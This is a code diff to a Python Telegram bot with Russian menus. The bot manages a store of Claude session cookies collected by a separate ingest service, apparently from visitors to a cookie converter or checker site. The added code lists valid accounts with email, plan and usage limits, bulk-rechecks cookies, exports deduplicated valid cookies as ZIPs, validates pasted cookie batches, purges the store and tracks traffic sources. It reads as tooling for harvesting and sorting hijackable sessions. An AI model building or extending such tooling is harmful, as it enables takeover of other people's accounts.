@@ -8,8 +8,9 @@ reads the SQLite database the ingest service writes, and does two things:
   * pushes a short alert on new conversions and Claude checks, according to the
     notification settings.
 
-Heavy work (overview, geography, ZIP) runs on a thread pool. The getUpdates
-loop only acknowledges the callback and hands the job off.
+Screens edit on a UI pool so opening a section never waits behind a ZIP or a
+mass recheck. Heavy work (ZIP, recheck, purge, pasted batches) uses its own
+pool. The getUpdates loop only acknowledges the callback and hands the job off.
 """
 
 from __future__ import annotations
@@ -24,6 +25,7 @@ import tempfile
 import threading
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 import zipfile
 from concurrent.futures import ThreadPoolExecutor
@@ -94,9 +96,14 @@ TOGGLE_KEYS = frozenset({
     "push_convert", "push_check_valid", "push_check_invalid", "push_credential",
     "daily_summary",
 })
-WORK = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-bot")
+UI = ThreadPoolExecutor(max_workers=4, thread_name_prefix="cc-bot-ui")
+HEAVY = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-bot-heavy")
 _recheck_guard = threading.Lock()
 _recheck_running = False
+_purge_guard = threading.Lock()
+_purge_running = False
+_blob_table: bool | None = None
+VALID_LIST_CAP = 20
 
 
 def log(msg: str) -> None:
@@ -190,8 +197,10 @@ def answer_callback(cb_id: str, text: str = ""):
 
 
 def db() -> sqlite3.Connection:
-    conn = sqlite3.connect(DB_PATH, timeout=5)
-    conn.execute("PRAGMA busy_timeout=5000")
+    conn = sqlite3.connect(DB_PATH, timeout=10)
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA busy_timeout=8000")
+    conn.execute("PRAGMA synchronous=NORMAL")
     conn.row_factory = sqlite3.Row
     return conn
 
@@ -242,15 +251,25 @@ def fmt(n) -> str:
     return f"{int(n):,}".replace(",", " ")
 
 
+def _clip_html(text: str, limit: int = 4000) -> str:
+    if len(text) <= limit:
+        return text
+    return text[: limit - 16] + "\n<i>…</i>"
+
+
 def _html(text) -> str:
     return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
 
 
 def _has_blob(conn) -> bool:
+    global _blob_table
+    if _blob_table is not None:
+        return _blob_table
     row = conn.execute(
         "SELECT 1 FROM sqlite_master WHERE type='table' AND name='blobs'"
     ).fetchone()
-    return bool(row)
+    _blob_table = bool(row)
+    return _blob_table
 
 
 def view_overview(conn) -> str:
@@ -466,6 +485,42 @@ def view_recent(conn):
     return "\n".join(lines), kb
 
 
+def view_channels(conn):
+    """Channel attribution: top referrer domains and UTM source distribution."""
+    lines = ["<b>🔗 Каналы</b>\n", "<i>откуда пришёл трафик (за всё время)</i>\n"]
+
+    refs = conn.execute(
+        "SELECT ref, COUNT(*) AS count FROM events "
+        "WHERE ref IS NOT NULL AND ref != '' GROUP BY ref ORDER BY count DESC LIMIT 12"
+    ).fetchall()
+    if refs:
+        def ref_domain(r):
+            host = urllib.parse.urlparse(r["ref"]).netloc
+            return host or "прямой переход"
+        lines.append("<u>Источники (referrers)</u>\n" + _bars(refs, ref_domain))
+
+    utm_counts: dict[str, int] = {}
+    for r in conn.execute(
+        "SELECT utm FROM events WHERE utm IS NOT NULL AND utm != '' LIMIT 2000"
+    ).fetchall():
+        try:
+            src = json.loads(r["utm"]).get("source") or ""
+        except (ValueError, TypeError):
+            continue
+        if src:
+            utm_counts[src] = utm_counts.get(src, 0) + 1
+    if utm_counts:
+        bars = [
+            {"source": k, "count": v}
+            for k, v in sorted(utm_counts.items(), key=lambda kv: -kv[1])[:10]
+        ]
+        lines.append("<u>UTM-источники</u>\n" + _bars(bars, lambda r: r["source"]))
+
+    if len(lines) <= 2:
+        lines.append("<i>Каналов пока нет — метки появятся после первого прихода с referrer/UTM.</i>")
+    return "\n".join(lines), _back()
+
+
 def view_settings(conn) -> tuple[str, list]:
     migrate_push_settings(conn)
     conn.commit()
@@ -505,52 +560,128 @@ def _pipeline_blob_count(conn, valid_only: bool) -> int:
     extra = "AND e.valid=1" if valid_only else ""
     return scalar(
         conn,
-        f"SELECT COUNT(*) FROM events e JOIN blobs b ON b.event_id=e.id "
-        f"WHERE e.type IN ('convert','check','credential') {extra}",
+        "SELECT COUNT(*) FROM events e "
+        "WHERE e.type IN ('convert','check','credential') "
+        f"{extra} AND EXISTS (SELECT 1 FROM blobs b WHERE b.event_id=e.id)",
     )
 
 
 def _pipeline_blob_rows(conn, valid_only: bool):
     extra = "AND e.valid=1" if valid_only else ""
     return conn.execute(
-        f"SELECT e.id, e.ts, e.type, e.to_fmt, e.valid, e.info, b.output FROM events e "
-        f"JOIN blobs b ON b.event_id=e.id "
-        f"WHERE e.type IN ('convert','check','credential') {extra} ORDER BY e.id",
+        "SELECT e.id, e.ts, e.type, e.to_fmt, e.valid, e.info, b.output FROM events e "
+        "JOIN blobs b ON b.event_id=e.id "
+        "WHERE e.type IN ('convert','check','credential') "
+        f"{extra} ORDER BY e.id DESC",
     ).fetchall()
+
+
+def _account_key(info: dict, event_id: int) -> str:
+    email = (info.get("email") or "").strip().lower()
+    return email or f"#{event_id}"
+
+
+def valid_accounts(conn) -> list[dict]:
+    """Newest-first unique valid accounts from `info`. Does not read blobs."""
+    rows = conn.execute(
+        "SELECT id, info FROM events "
+        "WHERE type IN ('convert','check','credential') AND valid=1 AND info IS NOT NULL "
+        "ORDER BY id DESC",
+    ).fetchall()
+    seen: set[str] = set()
+    out: list[dict] = []
+    for row in rows:
+        info = load_info(row)
+        if not info:
+            continue
+        key = _account_key(info, int(row["id"]))
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append({
+            "id": int(row["id"]),
+            "email": info.get("email") or "—",
+            "plan": info.get("plan") or "Claude",
+            "session": info.get("session"),
+            "weekly": info.get("weekly"),
+        })
+    return out
+
+
+def _format_limits(account: dict) -> str:
+    sess = account.get("session")
+    week = account.get("weekly")
+    sess_txt = f"{sess}%" if sess is not None else "—"
+    week_txt = f"{week}%" if week is not None else "—"
+    return f"5ч {sess_txt} · 7д {week_txt}"
+
+
+def _format_accounts_block(accounts: list[dict], cap: int = VALID_LIST_CAP) -> str:
+    if not accounts:
+        return "<i>Пока нет валидных с почтой и планом. Нажми «Проверить все куки».</i>"
+    lines = []
+    for i, account in enumerate(accounts[:cap], 1):
+        lines.append(
+            f"{i}. <code>{_html(account['email'])}</code> · "
+            f"<b>{_html(account['plan'])}</b> · {_html(_format_limits(account))}"
+        )
+    extra = len(accounts) - cap
+    if extra > 0:
+        lines.append(f"\n<i>и ещё {fmt(extra)} — все будут в ZIP.</i>")
+    return "\n".join(lines)
 
 
 def view_cookies(conn) -> tuple[str, list]:
     valid = _pipeline_blob_count(conn, True)
     total = _pipeline_blob_count(conn, False)
+    accounts = valid_accounts(conn)
     txt = (
         "<b>📥 Куки</b>\n\n"
-        "Один склад: конвертер, проверка и credential.\n\n"
-        f"✅ Валидные: <b>{fmt(valid)}</b>\n"
-        f"📦 Все: <b>{fmt(total)}</b>"
+        f"✅ Валидных: <b>{fmt(valid)}</b>\n"
+        f"📦 Всего наборов: <b>{fmt(total)}</b>\n\n"
+        "<u>Валидные аккаунты</u>\n"
+        + _format_accounts_block(accounts)
     )
     kb = [
         [{"text": "Скачать валидные", "callback_data": "ck:valid"}],
         [{"text": "Скачать все", "callback_data": "ck:all"}],
         [{"text": "Проверить все куки на валид", "callback_data": "ck:recheck"}],
+        [{"text": "Удалить все", "callback_data": "ck:purge"}],
         [{"text": "‹ Назад", "callback_data": "home"}],
     ]
-    return txt, kb
+    return _clip_html(txt), kb
 
 
 def view_cookies_mode(conn, pile: str) -> tuple[str, list]:
     valid_only = pile == "valid"
     n = _pipeline_blob_count(conn, valid_only)
     title = "Валидные" if valid_only else "Все"
-    txt = (
-        f"<b>📥 {title}</b>\n\n"
-        f"Наборов: <b>{fmt(n)}</b>\n"
-        "Скачать по отдельности (ZIP, файл на набор) или одним файлом "
-        "(одна кука — одна строка)."
+    parts = [f"<b>📥 {title}</b>\n", f"Наборов: <b>{fmt(n)}</b>\n"]
+    if valid_only:
+        parts.append("\n<u>Аккаунты</u>\n" + _format_accounts_block(valid_accounts(conn)) + "\n")
+    parts.append(
+        "\nСкачать по отдельности (ZIP, файл на аккаунт: почта, план, лимиты) "
+        "или одним файлом (одна кука — одна строка)."
     )
     kb = [
         [{"text": "По отдельности", "callback_data": f"dl:{pile}:zip"},
          {"text": "Одним файлом", "callback_data": f"dl:{pile}:txt"}],
         [{"text": "‹ Назад", "callback_data": "cookies"}],
+    ]
+    return _clip_html("".join(parts)), kb
+
+
+def view_cookies_purge(conn) -> tuple[str, list]:
+    n = _pipeline_blob_count(conn, False)
+    txt = (
+        "<b>🗑 Удалить все куки</b>\n\n"
+        f"Сотру <b>{fmt(n)}</b> наборов из склада (конвертер, проверка, credential). "
+        "Просмотры страниц останутся.\n\n"
+        "Это нельзя отменить."
+    )
+    kb = [
+        [{"text": "Да, удалить всё", "callback_data": "ck:purge:yes"}],
+        [{"text": "Отмена", "callback_data": "cookies"}],
     ]
     return txt, kb
 
@@ -605,29 +736,72 @@ def _file_slug(raw: str) -> str:
     return cleaned[:48]
 
 
+def _limits_slug(info: dict) -> str:
+    parts = []
+    sess = info.get("session")
+    week = info.get("weekly")
+    if sess is not None:
+        parts.append(f"5h{int(sess)}")
+    if week is not None:
+        parts.append(f"7d{int(week)}")
+    return "-".join(parts)
+
+
+def _row_info(row) -> dict:
+    try:
+        raw = row["info"]
+    except (IndexError, KeyError, TypeError):
+        return {}
+    if isinstance(raw, dict):
+        return raw
+    if not raw:
+        return {}
+    try:
+        parsed = json.loads(raw)
+    except (TypeError, ValueError):
+        return {}
+    return parsed if isinstance(parsed, dict) else {}
+
+
 def _zip_entry_name(row) -> str:
-    if row["type"] in ("check", "credential"):
-        email = ""
-        plan = ""
-        try:
-            raw_info = row["info"]
-        except (IndexError, KeyError):
-            raw_info = None
-        if raw_info:
-            try:
-                info = json.loads(raw_info)
-            except (TypeError, ValueError):
-                info = {}
-            if isinstance(info, dict):
-                email = info.get("email") or ""
-                plan = info.get("plan") or info.get("planLabel") or ""
+    info = _row_info(row)
+    typed = None
+    try:
+        typed = row["type"]
+    except (IndexError, KeyError, TypeError):
+        typed = None
+    if typed in ("check", "credential") or info.get("email") or info.get("plan"):
+        email = info.get("email") or ""
+        plan = info.get("plan") or info.get("planLabel") or ""
         local = email.split("@", 1)[0] if email else ""
         user = _file_slug(local) or "account"
         plan_part = _file_slug(re.sub(r"(?i)^claude\s+", "", plan)) or "plan"
-        mark = "valid" if row["valid"] == 1 else "invalid"
-        return f"{user}-{plan_part}-{mark}.txt"
+        try:
+            mark = "valid" if row["valid"] == 1 else "invalid"
+        except (IndexError, KeyError, TypeError):
+            mark = "valid"
+        bits = [user, plan_part]
+        limits = _limits_slug(info)
+        if limits:
+            bits.append(limits)
+        bits.append(mark)
+        return "-".join(bits) + ".txt"
     ext = "json" if row["to_fmt"] in JSON_FORMATS else "txt"
     return f"convert-{row['id']}-{_stamp(row['ts'])}.{ext}"
+
+
+def _dedupe_valid_rows(rows):
+    """Keep the newest blob per email (or per event if there is no email)."""
+    seen: set[str] = set()
+    out = []
+    for row in rows:
+        info = _row_info(row)
+        key = _account_key(info, int(row["id"]))
+        if key in seen:
+            continue
+        seen.add(key)
+        out.append(row)
+    return out
 
 
 def _send_txt_or_zip(chat_id: int, fname: str, text: str, caption: str) -> None:
@@ -644,6 +818,8 @@ def download_pipeline(conn, chat_id: int, pile: str, mode: str) -> str:
     if not _has_blob(conn):
         return "Нет данных"
     rows = _pipeline_blob_rows(conn, pile == "valid")
+    if pile == "valid":
+        rows = _dedupe_valid_rows(rows)
     if not rows:
         return "Нет данных"
     label = "валидные" if pile == "valid" else "все"
@@ -716,8 +892,8 @@ def recheck_all_stored() -> dict:
     }
 
 
-def _recheck_summary(stats: dict) -> str:
-    return (
+def _recheck_summary(stats: dict, accounts: list[dict] | None = None) -> str:
+    text = (
         "🔎 <b>Проверка всех кук</b>\n\n"
         f"Наборов: <b>{fmt(stats['total'])}</b>"
         f" · уникальных сессий: <b>{fmt(stats['unique'])}</b>\n"
@@ -725,6 +901,9 @@ def _recheck_summary(stats: dict) -> str:
         f"❌ невалидных: <b>{fmt(stats['invalid'])}</b>\n"
         f"⏭ без sessionKey: <b>{fmt(stats['skipped'])}</b>"
     )
+    if accounts:
+        text += "\n\n<u>Валидные аккаунты</u>\n" + _format_accounts_block(accounts)
+    return text
 
 
 def _job_recheck_all(chat_id: int) -> None:
@@ -740,13 +919,54 @@ def _job_recheck_all(chat_id: int) -> None:
         if stats["total"] == 0:
             send(chat_id, "Нет кук для проверки.")
             return
-        send(chat_id, _recheck_summary(stats))
+        conn = db()
+        try:
+            accounts = valid_accounts(conn)
+        finally:
+            conn.close()
+        send(chat_id, _recheck_summary(stats, accounts))
     except Exception as e:
         log(f"recheck all failed: {e!r}")
         send(chat_id, "Не удалось проверить все куки.")
     finally:
         with _recheck_guard:
             _recheck_running = False
+
+
+def purge_pipeline_cookies() -> int:
+    """Drop convert/check/credential events and their blobs. Pageviews stay."""
+    conn = db()
+    try:
+        n = _pipeline_blob_count(conn, False)
+        conn.execute(
+            "DELETE FROM blobs WHERE event_id IN "
+            "(SELECT id FROM events WHERE type IN ('convert','check','credential'))"
+        )
+        conn.execute(
+            "DELETE FROM events WHERE type IN ('convert','check','credential')"
+        )
+        conn.commit()
+        return n
+    finally:
+        conn.close()
+
+
+def _job_purge(chat_id: int) -> None:
+    global _purge_running
+    with _purge_guard:
+        if _purge_running:
+            send(chat_id, "Уже удаляю куки.")
+            return
+        _purge_running = True
+    try:
+        n = purge_pipeline_cookies()
+        send(chat_id, f"🗑 Удалил <b>{fmt(n)}</b> наборов. Просмотры страниц на месте.")
+    except Exception as e:
+        log(f"purge cookies failed: {e!r}")
+        send(chat_id, "Не удалось удалить куки.")
+    finally:
+        with _purge_guard:
+            _purge_running = False
 
 
 HOME_KB = [
@@ -758,6 +978,7 @@ HOME_KB = [
      {"text": "🕐 Последнее", "callback_data": "recent"}],
     [{"text": "📥 Куки", "callback_data": "cookies"},
      {"text": "⚙️ Настройки", "callback_data": "settings"}],
+    [{"text": "🔗 Каналы", "callback_data": "channels"}],
 ]
 
 
@@ -787,6 +1008,8 @@ def _screen(data: str, conn):
         return view_trend(conn), _back()
     if data == "recent":
         return view_recent(conn)
+    if data == "channels":
+        return view_channels(conn)
     if data == "settings":
         return view_settings(conn)
     if data == "cookies":
@@ -795,6 +1018,8 @@ def _screen(data: str, conn):
         return view_cookies_mode(conn, "valid")
     if data == "ck:all":
         return view_cookies_mode(conn, "all")
+    if data == "ck:purge":
+        return view_cookies_purge(conn)
     return None
 
 
@@ -958,11 +1183,23 @@ def _job_batch_check(chat_id: int, text: str) -> None:
     valid = [(raw, r) for raw, r in results if r.get("ok")]
     if valid:
         stamp = _stamp(int(time.time()))
-        rows = [
-            {"output": (r.get("freshCookie") or raw), "i": i}
-            for i, (raw, r) in enumerate(valid, 1)
-        ]
-        path, n = build_zip_file(rows, lambda r: f"valid-{r['i']}-{stamp}.txt")
+        rows = []
+        for i, (raw, r) in enumerate(valid, 1):
+            rows.append({
+                "id": i,
+                "ts": int(time.time()),
+                "type": "check",
+                "to_fmt": None,
+                "valid": 1,
+                "info": {
+                    "email": r.get("email"),
+                    "plan": r.get("planLabel"),
+                    "session": (r.get("session") or {}).get("percent"),
+                    "weekly": (r.get("weekly") or {}).get("percent"),
+                },
+                "output": (r.get("freshCookie") or raw),
+            })
+        path, n = build_zip_file(rows, _zip_entry_name)
         if n:
             _send_zip(chat_id, path, f"valid-cookies-{stamp}.zip", f"✅ Валидных: {n} шт.")
 
@@ -984,7 +1221,7 @@ def handle_update(u: dict):
             send(OWNER, diag_text())
         elif _looks_like_cookies(text):
             # Owner pasted cookies (one or a batch): check them all and reply.
-            WORK.submit(_job_batch_check, OWNER, text)
+            HEAVY.submit(_job_batch_check, OWNER, text)
         else:
             send(OWNER, home_text(), HOME_KB)
         return
@@ -1003,19 +1240,23 @@ def handle_update(u: dict):
                 if (len(parts) == 3 and parts[1] in ("valid", "all")
                         and parts[2] in ("zip", "txt")):
                     answer_callback(cb["id"], "Собираю…")
-                    WORK.submit(_job_download, "pipe", chat_id, (parts[1], parts[2]))
+                    HEAVY.submit(_job_download, "pipe", chat_id, (parts[1], parts[2]))
                     return
             if data.startswith("file:"):
                 rid = int(data.split(":", 1)[1])
                 answer_callback(cb["id"], "Отправляю…")
-                WORK.submit(_job_file, chat_id, rid)
+                HEAVY.submit(_job_file, chat_id, rid)
                 return
             if data == "ck:recheck":
                 answer_callback(cb["id"], "Запускаю проверку…")
-                WORK.submit(_job_recheck_all, chat_id)
+                HEAVY.submit(_job_recheck_all, chat_id)
+                return
+            if data == "ck:purge:yes":
+                answer_callback(cb["id"], "Удаляю…")
+                HEAVY.submit(_job_purge, chat_id)
                 return
             answer_callback(cb["id"])
-            WORK.submit(_job_screen, data, chat_id, mid)
+            UI.submit(_job_screen, data, chat_id, mid)
         except Exception as e:
             log(f"callback '{data}' failed: {e!r}")
             answer_callback(cb["id"], "Ошибка, см. логи")
